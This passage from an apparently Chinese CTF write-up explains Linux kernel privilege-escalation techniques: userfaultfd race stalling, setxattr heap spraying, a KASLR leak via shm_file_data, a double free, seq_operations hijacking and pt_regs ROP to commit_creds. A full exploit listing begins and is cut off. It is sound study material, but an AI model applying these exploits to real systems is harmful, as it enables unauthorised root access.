<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); <span class="comment">/* 调用poll函数轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); <span class="comment">/* 通过userfaultfd读取缺页信息 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap page error!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ...... (核心功能)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据实际需求不同，handler 函数可能会有所不同</li>
</ul>
<p><strong>setxattr</strong></p>
<p>setxattr 在 kernel 中可以为我们提供近乎任意大小的内核空间 object 分配</p>
<ul>
<li>调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr() -&gt; path_setxattr() -&gt; setxattr()</span><br></pre></td></tr></table></figure>
<ul>
<li>核心代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">/* 分配object */</span></span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123; <span class="comment">/* 向内核写入内容 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue); <span class="comment">/* 释放object */</span></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么这里 setxattr 系统调用便提供给我们这样一条调用链：</p>
<ul>
<li>在内核空间分配 object</li>
<li>向 object 内写入内容</li>
<li>释放分配的 object</li>
</ul>
<p>这里的 value 和 size 都是由我们来指定的，即我们可以分配任意大小的 object 并向其中写入内容</p>
<p><strong>堆占位</strong></p>
<p>堆占位技术就是用 setxattr 和 userfaultfd 配合使用得来的，可以在内核空间中分配任意大小的 object 并写入任意内容 </p>
<p>在 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，通过这一点可以构造出如下的利用：</p>
<ul>
<li>我们通过 mmap 分配连续的两个页面：<ul>
<li>在第二个页面上启用 userfaultfd 监视</li>
<li>在第一个页面的末尾写入我们想要的数据</li>
</ul>
</li>
<li>此时我们调用 setxattr 进行跨页面的拷贝，当 <code>copy_from_user</code> 拷贝到第二个页面时便会触发 userfaultfd</li>
<li>从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</li>
</ul>
<p>堆占位一般用于 UAF 漏洞，当内核产生 UAF 堆块时，可以用堆占位技术将一个 object 放入其中，之后通过 UAF 漏洞就可以操控这个 object</p>
<p><strong>pt_regs</strong></p>
<p>在 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，用如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br></pre></td></tr></table></figure>
<ul>
<li>将所有的寄存器压入内核栈上，形成一个 <code>pt_regs</code> 结构体，该结构体实质上位于内核栈底</li>
<li><code>pt_regs</code> 结构体的条目如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在内核中的结构如下图：</p>
<p><img src="/2023/02/01/userfaultfd+setxattr+pt_regs/1675218563307.png" alt="1675218563307"> </p>
<p>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们的 ROP 提供了可能，我们只需要寻找到一条形如 <code>add rsp,val; ret</code> 的 gadget 便能够完成 ROP</p>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0xabcddcba;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, add_rsp_0x40_ret;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, init_cred;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1145141919;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">arg#0 - seq_fd</span></span><br><span class="line"><span class="comment">arg#1 - rsp</span></span><br><span class="line"><span class="comment">syscall num - 0</span></span><br><span class="line"><span class="comment">返回地址</span></span><br><span class="line"><span class="comment">arg#2 - 8</span></span><br><span class="line"><span class="comment">arg#4 - 0x88888888</span></span><br><span class="line"><span class="comment">arg#5 - 0x99999999</span></span><br><span class="line"><span class="comment">arg#3 - swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line"><span class="comment">r11 - 0x1145141919</span></span><br><span class="line"><span class="comment">rbx - pop_rdi_ret</span></span><br><span class="line"><span class="comment">rbp - init_cred</span></span><br><span class="line"><span class="comment">r12 - commit_creds</span></span><br><span class="line"><span class="comment">r13 - add_rsp_0x40_ret</span></span><br><span class="line"><span class="comment">r14 - 0xabcddcba</span></span><br><span class="line"><span class="comment">r15 - 0xbeefdead</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以在调试时慢慢调整</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先需要绕开 kaslr，泄露内核基地址</p>
<p>由于本题目有条件竞争漏洞，于是我们可以在 PUSH 命令把用户态节点指针拷贝到内核之前，用另一个线程把该指针只向的数据释放掉</p>
<p>另外可以使用 userfaultfd 来增加条件竞争的几率：</p>
<ul>
<li>使用 PUSH 让分配线程先申请一个堆块 buf，然后在 <code>copy_from_user</code> 这里卡住</li>
<li>接着执行 userfaultfd 线程，由于 <code>copy_from_user</code> 没有执行完毕，所以在 PUSH 中生成的 <code>buf-&gt;value</code> 指针没有初始化</li>
</ul>
<p>于是我们可以事先申请一个用于泄露的 object 然后释放掉，用 PUSH 中的 <code>kmem_cache_alloc</code> 复用这个堆块，然后在 <code>copy_from_user</code> 触发 userfaultfd 线程后执行一次 POP，于是 <code>object-&gt;value</code> 就被输出到用户态缓存中了</p>
<p>程序中的 buf 使用如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Element struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> pid dq ?</span><br><span class="line"><span class="number">00000008</span> value dq ?</span><br><span class="line"><span class="number">00000010</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000018</span> Element ends</span><br></pre></td></tr></table></figure>
<ul>
<li>成员 value 的偏移为 0x8</li>
</ul>
<p>由于 <code>kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL)</code> 使用 kmallc-32，并且我们可以泄露偏移为 0x8 的指针，于是使用 <code>shm_file_data</code> 来作为 object：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中可以读取的 ns 域刚好指向内核 <code>.text</code> 段，由此我们可以泄露出内核基址 </li>
</ul>
<p>可以在通过 <code>shmget</code> 系统调用创建共享内存之后，使用 <code>shmat</code> 系统调用获得该结构体，然后通过 <code>shmdt</code> 我们可以释放该结构体</p>
<p>在 POP 时通过 <code>copy_to_user</code> 触发 userfaultfd，在 userfaultfd 线程中再 POP 一次，就可以构造出 Double free（使内核模块申请的 UAF 堆块被释放两次，在 kmalloc-32 当中的第一个 object 指向自身，接下来的两次分配中我们都将会获得同一个 object）</p>
<p>最后需要用堆占位技术来劫持 <code>seq_operations</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用 <code>setxattr</code> 函数，在 <code>copy_from_user</code> 触发 userfaultfd 线程后，采用常规的 pt_regs 来完成 ROP </p>
<p>具体的步骤如下：</p>
<ul>
<li>打开 <code>/proc/self/stat</code> 分配大量 <code>seq_operations</code> 结构体做备用 </li>
<li>完成内核基地址泄露和 Double free 的构造</li>
<li>用 mmap 分配两 page 大小的内存，在第一个 page 最后8字节写上 magic gadget</li>
<li>打开 <code>/proc/self/stat</code> 使 <code>seq_operations</code> 结构体占用 UAF 堆块</li>
<li>执行 <code>setxattr</code>，分配一个堆块复用 <code>seq_operations</code> 结构体，然后触发 userfaultfd</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">/* 分配object */</span></span><br><span class="line"><span class="keyword">if</span> (!kvalue)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123; <span class="comment">/* 向内核写入内容 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后使用 pt_regs 来完成并触发 ROP</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>             dev_fd;</span><br><span class="line"><span class="keyword">size_t</span>          seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>          seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>     *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span>   page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span 